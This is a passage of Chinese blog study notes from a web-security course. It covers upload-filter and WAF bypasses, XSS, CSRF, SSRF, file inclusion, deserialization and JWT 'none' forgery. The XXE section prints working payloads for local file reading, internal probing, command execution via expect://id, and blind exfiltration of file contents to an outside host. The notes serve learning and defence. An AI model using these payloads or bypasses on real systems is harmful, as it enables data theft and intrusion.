class="line">脚本函数漏洞-CVE-2015-2348</span><br><span class="line">数组接受+目录命名</span><br><span class="line"></span><br><span class="line"># php</span><br><span class="line">getimagesize()获取图片的信息，如果不是图片则会报错，代码无法往下执行</span><br><span class="line">exif_imagetype() 获取图片类型</span><br><span class="line">imagecreatefrompng()</span><br><span class="line">imagecreatefromgif()</span><br><span class="line"></span><br><span class="line"># 二次渲染</span><br><span class="line">服务器接受文件后，再将文件重命名或删除</span><br><span class="line">二次渲染不一定有漏洞</span><br><span class="line">在二次渲染之前进行文件验证就没有漏洞</span><br><span class="line">在二次渲染时进行文件验证就可能有漏洞</span><br><span class="line">属于逻辑漏洞</span><br><span class="line">可以通过占用文件来绕过漏洞</span><br><span class="line"></span><br><span class="line"># 目录命名</span><br><span class="line">将upload.jpg改为upload.php/.jpg</span><br><span class="line"></span><br><span class="line"># 数组接受+目录命名</span><br><span class="line">burp中save_name=&quot;upload.jpg&quot;</span><br><span class="line">对其设置为数组，即：</span><br><span class="line">save_name[0]=&quot;x.php&quot;</span><br><span class="line">save_name[2]=&quot;jpg&quot;</span><br><span class="line">当文件检测时，$file=&#123;&quot;x.php&quot;,&quot;&quot;,&quot;jpg&quot;&#125;</span><br><span class="line">最后一个为jpg，可以绕过白名单</span><br><span class="line">使用目录命名时：save_name=&quot;x.php/&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第二十三天"><a href="#第二十三天" class="headerlink" title="第二十三天"></a>第二十三天</h2><p><img src="/2021/10/01/xiaodi1/image-20210920153434040.png" alt="image-20210920153434040"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 解析漏洞</span><br><span class="line">apache低版本解析漏洞</span><br><span class="line">例如：</span><br><span class="line">phpinfo.php.xxx</span><br><span class="line">首先识别xxx，发现无法识别，随后向前识别php。</span><br><span class="line"></span><br><span class="line">IIS7.5/nigix低版本解析漏洞</span><br><span class="line">upload.jpg/.php</span><br><span class="line"></span><br><span class="line">nigix文件名漏洞</span><br><span class="line">在upload.gif 在文件名后添加空格</span><br><span class="line">上传成功后，访问upload.gif .php</span><br><span class="line">访问的时候将空格的16进制数据改为20 00</span><br><span class="line"></span><br><span class="line"># 编辑器漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第二十四天"><a href="#第二十四天" class="headerlink" title="第二十四天"></a>第二十四天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 上传参数分析</span><br><span class="line">Content-Disposition：一般不可更改</span><br><span class="line">name：表单参数值，不可更改</span><br><span class="line">filename：可更改</span><br><span class="line">Content-Type：文件MINE，视情况更改</span><br><span class="line"></span><br><span class="line"># 常见绕过方法</span><br><span class="line">数据溢出-防匹配（xxx...）</span><br><span class="line">在正常参数之前添加大量数据，实现数据溢出</span><br><span class="line">注需要加;防止影响正常参数传递</span><br><span class="line"></span><br><span class="line">符号变异-防匹配（&#x27;&quot;;/）</span><br><span class="line">安全狗可以用&quot;x.php实现绕过</span><br><span class="line">x.php&quot;不行</span><br><span class="line">冒号不闭合，使服务器找不到对应的参数</span><br><span class="line">将其他数据写入filename，字符串闭合后，再写入x.php注入成功</span><br><span class="line">即安全狗识别前面的字符串，最后x.php赋值给filename</span><br><span class="line"></span><br><span class="line">数据截断-防匹配（%00 换行 ;）</span><br><span class="line">分块传输</span><br><span class="line"></span><br><span class="line">重复数据-防匹配（参数多次）</span><br><span class="line">递归循环</span><br><span class="line"></span><br><span class="line"># fuzz 模糊测试</span><br><span class="line"></span><br><span class="line"># 文件上传修复方案</span><br><span class="line">后端验证：采用服务端验证模式</span><br><span class="line">后缀验证：基于白名单，黑名单</span><br><span class="line">MIME验证：基于上传自带类型检测</span><br><span class="line">内容检测：文件头，完整性检测</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第二十五天"><a href="#第二十五天" class="headerlink" title="第二十五天"></a>第二十五天</h2><p>xss跨站</p>
<p><img src="/2021/10/01/xiaodi1/image-20211025142723291.png" alt="image-20211025142723291"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># XSS跨站漏洞产生原理，危害，特点</span><br><span class="line">本质：脚本语言注入网页之中</span><br><span class="line">产生层面，函数类，漏洞操作对应层，危害影响，浏览器内核版本</span><br><span class="line"></span><br><span class="line"># XSS跨站漏洞分类：反射（非持续型），存储（持续型），DOM</span><br><span class="line">存储型：攻击被记录到数据库中，每次打开页面都会触发漏洞</span><br><span class="line">反射型：攻击被写在get或POST中，不会写入数据库</span><br><span class="line">DOM型：请求并没有发送给后端的脚本代码，而是直接由静态前端代码执行完毕，并回显</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/01/xiaodi1/image-20211025151438842.png" alt="image-20211025151438842"></p>
<blockquote>
<p>DOM树</p>
<p>页面内容大多时通过url控制，有的页面内容改变但url没有改变，是因为通过DOM，使用脚本获取新的信息，没有改变url。</p>
</blockquote>
<h2 id="第二十六天"><a href="#第二十六天" class="headerlink" title="第二十六天"></a>第二十六天</h2><p>通过构造js代码，可以让其他用户浏览注入信息时，触发js代码，连接指定服务器，发送payload，获取cookie等信息。</p>
<p><strong>beef工具攻击</strong></p>
<h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><p>cookie：存储在本地，存活时间较长，小中型<br>session：会话存储在服务器，存活时间较短，大型</p>
<p>可以通过phpinfo读取到session</p>
<h2 id="第二十七天"><a href="#第二十七天" class="headerlink" title="第二十七天"></a>第二十七天</h2><h3 id="HTTPONLY"><a href="#HTTPONLY" class="headerlink" title="HTTPONLY"></a>HTTPONLY</h3><p>防止js无法读取cookie</p>
<p>进入后台的方法</p>
<ul>
<li>cookie</li>
<li>账号密码</li>
</ul>
<p>绕过httponlu：</p>
<ul>
<li>浏览器未保存账号密码：需要xss缠身登录地址，利用表单劫持</li>
<li>浏览器保存账号密码：产生在后台的xss，存储型xss如留言等，从看清回去读取账号密码</li>
</ul>
<h2 id="xss过滤：-大小写-双写-编码-添加检测内容，注释检测内容"><a href="#xss过滤：-大小写-双写-编码-添加检测内容，注释检测内容" class="headerlink" title="xss过滤：- 大小写- 双写- 编码- 添加检测内容，注释检测内容"></a>xss过滤：<br>- 大小写<br>- 双写<br>- 编码<br>- 添加检测内容，注释检测内容</h2><h2 id="防御csrf-同源策略"><a href="#防御csrf-同源策略" class="headerlink" title="防御csrf- 同源策略"></a>防御csrf<br>- 同源策略</h2><h2 id="第二十八天"><a href="#第二十八天" class="headerlink" title="第二十八天"></a>第二十八天</h2><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><p>常规waf绕过思路</p>
<ul>
<li>标签语法替换</li>
<li>特殊符号干扰</li>
<li>提交方式更改</li>
<li>垃圾数据一处</li>
<li>加密解密算法</li>
<li>结合其他漏洞</li>
</ul>
<h2 id="第二十九天"><a href="#第二十九天" class="headerlink" title="第二十九天"></a>第二十九天</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><ul>
<li>随机token，检测数据包唯一性		不可绕过</li>
<li>同源策略，referer					可绕过</li>
<li>需要输入密码</li>
<li>验证码</li>
<li>限制请求方式为POST请求</li>
</ul>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><img src="/2021/10/01/xiaodi1/ssrf.png" alt="ssrf"></p>
<p>利用协议：http、file、dict、ftp、gopher等</p>
<p>漏洞攻击：端口扫描、指纹之别、漏洞利用、内网探针</p>
<h2 id="第三十天"><a href="#第三十天" class="headerlink" title="第三十天"></a>第三十天</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>原理：</p>
<ul>
<li>现实应用情况<ul>
<li>根据实际情况找可能存在的相关漏洞</li>
</ul>
</li>
<li>网站代码情况<ul>
<li>可控变量</li>
<li>漏洞函数</li>
</ul>
</li>
</ul>
<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>执行脚本代码：php、java、python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># php</span><br><span class="line">eval()			将参数当作php代码执行</span><br><span class="line">echo()			输出参数执行</span><br><span class="line">	echo 参数	代码执行</span><br><span class="line">	echo `参数`	命令执行</span><br><span class="line">system()		执行操作系统命令并输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>检测方法</p>
<ul>
<li>白盒<ul>
<li>代码审计</li>
</ul>
</li>
<li>黑盒<ul>
<li>扫描工具</li>
<li>公开漏洞</li>
<li>手工看参数值及功能点</li>
</ul>
</li>
</ul>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>执行系统命令：linux、windows</p>
<h2 id="第三十一天"><a href="#第三十一天" class="headerlink" title="第三十一天"></a>第三十一天</h2><h3 id="文件操作安全漏洞"><a href="#文件操作安全漏洞" class="headerlink" title="文件操作安全漏洞"></a>文件操作安全漏洞</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>见第24天</p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ul>
<li>白盒<ul>
<li>代码审计</li>
</ul>
</li>
<li>黑盒<ul>
<li>扫描工具</li>
<li>公开漏洞</li>
<li>手工看参数值及功能点</li>
</ul>
</li>
</ul>
<h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul>
<li>本地包含<ul>
<li>无限制</li>
<li>有限制</li>
</ul>
</li>
<li>远程包含<ul>
<li>无限制</li>
<li>有限制</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本地包含</span><br><span class="line">绕过包含文件加后缀方法</span><br><span class="line">1. %00截断</span><br><span class="line">2. 添加./至文件名长度大于系统要求长度，windows系统文件名最大长度256位、linux系统文件名最大长度4096位</span><br><span class="line"></span><br><span class="line">远程包含</span><br><span class="line">限制文件名</span><br><span class="line">在文件名后添加：%20、%23、?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用协议<br><img src="/2021/10/01/xiaodi1/fileload.png" alt="fileload"></p>
<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><ul>
<li>固定后缀</li>
<li>固定文件</li>
<li>WAF产品</li>
</ul>
<h2 id="第三十二天"><a href="#第三十二天" class="headerlink" title="第三十二天"></a>第三十二天</h2><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>产生原因：任意语言代码文件下载功能函数</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
<li>常见文件<ul>
<li>后台首页日志等</li>
</ul>
</li>
<li>敏感文件<ul>
<li>数据库配置文件</li>
<li>各种接口文件</li>
<li>密钥信息文件</li>
</ul>
</li>
</ul>
<h5 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h5><ul>
<li>扫描工具爬取或扫描地址</li>
<li>下载好的代码中分析路径和包含文件漏洞获取</li>
</ul>
<h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ul>
<li>wAF产品</li>
<li>固定目录或过滤跨目录符号</li>
<li>目录权限设置或单独文件权限设置</li>
</ul>
<blockquote>
<p>1.文件被解析——文件包含漏洞</p>
<p>2.显示源代码——文件读取漏洞</p>
<p>3.提示文件下载——文件下载漏洞</p>
</blockquote>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><h2 id="第三十三天"><a href="#第三十三天" class="headerlink" title="第三十三天"></a>第三十三天</h2><h3 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h3><p>代码层面安全问题</p>
<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p>分类：</p>
<ul>
<li>水平越权<ul>
<li>获取同级别其他用户的数据</li>
</ul>
</li>
<li>垂直越权<ul>
<li>执行更高权限账号才可执行的操作</li>
</ul>
</li>
<li>未授权访问<ul>
<li>通过删除请求中的认证信息重放请求，依旧可以访问或完成操作</li>
</ul>
</li>
</ul>
<p>原理：</p>
<ul>
<li>前端安全造成：界面<ul>
<li>判断用户等级后，代码界面部分进行可选显示</li>
</ul>
</li>
<li>后端安全造成：数据库<ul>
<li>数据包有传输用户编号、用户组编号、类型编号时，尝试对值进行修改，测试越权漏洞</li>
</ul>
</li>
</ul>
<h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>如何获取操作请求数据包</p>
<ul>
<li>普通用户前端有操作界面可以抓取数据包</li>
<li>通过网站源码本地搭建自己模拟抓取</li>
<li>盲猜</li>
</ul>
<h2 id="第三十四天"><a href="#第三十四天" class="headerlink" title="第三十四天"></a>第三十四天</h2><h4 id="登录功能点"><a href="#登录功能点" class="headerlink" title="登录功能点"></a>登录功能点</h4><ul>
<li>暴力破解</li>
<li>本地加密传输（HTTP&#x2F;HTTPS传输）<ul>
<li>密码加密</li>
</ul>
</li>
<li>cookie脆弱<ul>
<li>cookie认证存在漏洞</li>
</ul>
</li>
<li>session劫持</li>
<li>密文对比认证</li>
</ul>
<h4 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h4><ul>
<li>支付篡改</li>
<li>数量篡改</li>
<li>请求重放</li>
</ul>
<h2 id="第三十五天"><a href="#第三十五天" class="headerlink" title="第三十五天"></a>第三十五天</h2><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><h4 id="找回"><a href="#找回" class="headerlink" title="找回"></a>找回</h4><p>找回重置机制</p>
<ul>
<li>客户端回显</li>
<li>response状态值</li>
<li>验证码爆破</li>
<li>找回流程绕过</li>
</ul>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口调用</p>
<ul>
<li>短信轰炸</li>
<li>来电轰炸</li>
</ul>
<h2 id="第三十六天"><a href="#第三十六天" class="headerlink" title="第三十六天"></a>第三十六天</h2><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>绕过方法</p>
<ul>
<li>token<ul>
<li>爆破</li>
<li>回显</li>
<li>固定</li>
</ul>
</li>
<li>验证码<ul>
<li>爆破</li>
<li>识别</li>
<li>复用</li>
<li>回显</li>
<li>绕过</li>
</ul>
</li>
</ul>
<h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>分类：图片、手机、邮箱、语音、视频、操作等</p>
<p>原因：验证生成或验证过程中的逻辑问题</p>
<p>危害：账号权限泄露、短信轰炸、遍历、任意用户操作</p>
<p>漏洞：客户端回显、验证码复用、验证码爆破、绕过</p>
<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><p>爆破方法，burp抓包</p>
<h2 id="第三十七天"><a href="#第三十七天" class="headerlink" title="第三十七天"></a>第三十七天</h2><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>系列化：对象转字符串		有利于传输与保存</p>
<p>反序列化：字符串转对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;string1&quot;——s:7:&quot;string1&quot;</span><br><span class="line">123——i:123</span><br></pre></td></tr></table></figure>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
<li>sql注入</li>
<li>代码执行</li>
<li>目录遍历</li>
</ul>
<h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul>
<li>有类<ul>
<li>触发魔术方法<ul>
<li>__construct</li>
<li>__destruct</li>
<li>__call</li>
<li>__callStatic</li>
<li>__get</li>
<li>__set</li>
<li>__isset</li>
<li>__unset</li>
<li>__invoke</li>
<li>__wakeup</li>
<li>__trstring</li>
</ul>
</li>
</ul>
</li>
<li>无类</li>
</ul>
<h2 id="第三十八天"><a href="#第三十八天" class="headerlink" title="第三十八天"></a>第三十八天</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul>
<li>payload生成器<ul>
<li>ysoserial</li>
</ul>
</li>
<li>自定义检测工具或脚本</li>
</ul>
<h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><blockquote>
<p>一段数据由<code>rO0AB</code>开头，一般是java序列化base64加密<br>一段数据由<code>aced</code>开头，一般是java序列化的16进制</p>
</blockquote>
<ul>
<li>黑盒<ul>
<li>数据格式点<ul>
<li>HTTP请求参数</li>
<li>自定义协议</li>
<li>RMI协议</li>
<li>子主题5</li>
</ul>
</li>
<li>特定特征扫描</li>
</ul>
</li>
<li>白盒<ul>
<li>函数点<ul>
<li>objectInputStream.readObject</li>
<li>objectInputStream.readUnshared</li>
<li>objectMapper.readValue</li>
<li>XMLDecoder.readObject</li>
<li>XStream.fromXML</li>
<li>JSON.parseObject</li>
</ul>
</li>
<li>组件点<ul>
<li>参考ysoserial库</li>
</ul>
</li>
<li>代码点<ul>
<li>RCE执行</li>
<li>数据认证</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="第三十九天"><a href="#第三十九天" class="headerlink" title="第三十九天"></a>第三十九天</h2><h3 id="XXE-amp-XML利用检测绕过"><a href="#XXE-amp-XML利用检测绕过" class="headerlink" title="XXE&amp;XML利用检测绕过"></a>XXE&amp;XML利用检测绕过</h3><p><img src="/2021/10/01/xiaodi1/xml.png" alt="xml"></p>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul>
<li>XML<ul>
<li>传输和存储数据的语言或格式</li>
<li>XML文档结构包含XML生命、DTD文档类型定义、文档元素</li>
<li>独立于原件和硬件的信息传输工具</li>
</ul>
</li>
<li>XXE<ul>
<li>XML外部实体注入漏洞<blockquote>
<p>HTML用来显示数据，焦点是数据的外观</p>
<p>XML用来传输和存储数据，焦点是数据的内容</p>
<p>HTML旨在显示信息，XML旨在传输信息</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><ul>
<li>文件读取</li>
<li>RCE执行</li>
<li>内网攻击</li>
<li>DOS攻击</li>
</ul>
<p><img src="/2021/10/01/xiaodi1/%E8%84%9A%E6%9C%AC%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE.png" alt="脚本本支持协议"></p>
<h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><ul>
<li>白盒<ul>
<li>函数及可控变量查找</li>
<li>存储和存储数据格式类型</li>
</ul>
</li>
<li>黑盒<ul>
<li>人工<ul>
<li>数据格式类型判断<ul>
<li><code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code></li>
</ul>
</li>
<li>content-TYPE值判断<ul>
<li>text&#x2F;xml</li>
<li>application&#x2F;xml</li>
</ul>
</li>
<li>更改content-type值看返回</li>
</ul>
</li>
<li>工具</li>
</ul>
</li>
</ul>
<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><ul>
<li>输出形式<ul>
<li>有回显<ul>
<li>协议玩法<ul>
<li>http</li>
<li>file</li>
<li>各种脚本支持协议</li>
</ul>
</li>
<li>外部利用</li>
</ul>
</li>
<li>无回显<ul>
<li>外部利用-反向链接配合</li>
</ul>
</li>
</ul>
</li>
<li>过滤绕过<ul>
<li>协议玩法</li>
<li>外部引用</li>
<li>编码UTF-16BE</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># 读取文件</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># 内网探针</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;? encoding=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.103:8081/index.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># RCE</span><br><span class="line"># 在安装expect扩展的php环境里执行系统命令</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># 引入外部实体</span><br><span class="line"># 只有在设置允许引入外部实体时才有用</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evilw.dtd&quot;&gt;</span><br><span class="line">	%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 无回显-读取文件</span><br><span class="line"># 1.读取文件</span><br><span class="line"># 2.引入外部实体，外部实体向指定url发出请求，参数为读取文件</span><br><span class="line"># 3.查看日志</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/text.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.0.103:8081/test.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &quot;http://192.168.0.103:8081/?data=%file;&quot;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br><span class="line"></span><br><span class="line"># 协议-读文件（绕过）</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
<li><code>ENTITY</code>,<code>SYSTEM``file</code>等关键词被过滤<ul>
<li>编码绕过：UTF-16BE</li>
</ul>
</li>
<li>http被过滤<ul>
<li>data:&#x2F;&#x2F;协议绕过</li>
<li>file:&#x2F;&#x2F;协议加文件上传</li>
<li>php:&#x2F;&#x2F;filter协议加文件上传</li>
</ul>
</li>
</ul>
<h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><ul>
<li>进制外部实体引用</li>
<li>过滤关键字</li>
<li>WAF</li>
</ul>
<h2 id="第四十天"><a href="#第四十天" class="headerlink" title="第四十天"></a>第四十天</h2><h3 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h3><p><img src="/2021/10/01/xiaodi1/java.png" alt="java"></p>
<h4 id="JWT安全及预编译CASE注入"><a href="#JWT安全及预编译CASE注入" class="headerlink" title="JWT安全及预编译CASE注入"></a>JWT安全及预编译CASE注入</h4><p><img src="/2021/10/01/xiaodi1/jwt.png" alt="jwt"></p>
<p>jwt（JSON Web Token）一种跨域验证身份方案，jwt不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p>
<p>jwt的数据分为三部分：头部、声明、签名，BASE64加密<br><img src="/2021/10/01/xiaodi1/jwt%E7%AD%BE%E5%90%8D.png" alt="jwt签名"><br><img src="/2021/10/01/xiaodi1/jwt%E4%BC%A0%E8%BE%93.png" alt="jwt传输"></p>
<h5 id="防御sql注入"><a href="#防御sql注入" class="headerlink" title="防御sql注入"></a>防御sql注入</h5><ul>
<li>session（session内容正常情况下用户无法修改sql语句）</li>
<li>参数绑定（sql预编译）<ul>
<li>通过case when语句可以将order by后的orderExpression表达式中添加select语句</li>
</ul>
</li>
</ul>
<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><h6 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h6><p>####### 无密钥<br>由于签名存在，修改前面的声明会被发现与签名不对应，是无效token；解决方法是在header中加密模式改为none，即不加密，签名则为空，可实现身份验证。</p>
<blockquote>
<p>在HTTP传输中，BASE64的<code>=``+``,``/</code>容易产生歧义，故产生了与URL兼容三BASE64 URL编码</p>
</blockquote>
<p>####### 有密钥<br>修改数据后加密</p>
<h6 id="爆破攻击"><a href="#爆破攻击" class="headerlink" title="爆破攻击"></a>爆破攻击</h6><h2 id="第四十一天"><a href="#第四十一天" class="headerlink" title="第四十一天"></a>第四十一天</h2><h3 id="JAVA安全-目录遍历、访问控制、xss"><a href="#JAVA安全-目录遍历、访问控制、xss" class="headerlink" title="JAVA安全-目录遍历、访问控制、xss"></a>JAVA安全-目录遍历、访问控制、xss</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>双写绕过</p>
<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4>
      
    </div>
    <footer class="article-footer">
